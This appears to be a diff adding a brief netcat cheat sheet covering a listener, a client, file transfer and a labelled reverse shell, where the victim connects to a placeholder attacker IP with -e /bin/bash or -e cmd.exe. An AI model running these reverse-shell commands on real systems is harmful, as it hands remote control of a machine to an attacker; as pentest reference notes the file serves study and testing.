@@ -1,0 +1,27 @@
+======
+server
+======
+nc -nvlp <port>
+
+======
+client
+======
+nc -nv <server ip> <server port>
+
+=============
+file transfer
+=============
+sender
+	nc -nv <receiver ip> <receiver port> < <filename>
+receiver
+	nc -nvlp <port> > <filename>
+
+=============
+reverse shell
+=============
+attacker
+	nc -nvlp <port>
+victim
+	nc -nv <attacker ip> <attacker port> -e /bin/bash
+	nc -nv <attacker ip> <attacker port> -e cmd.exe
+
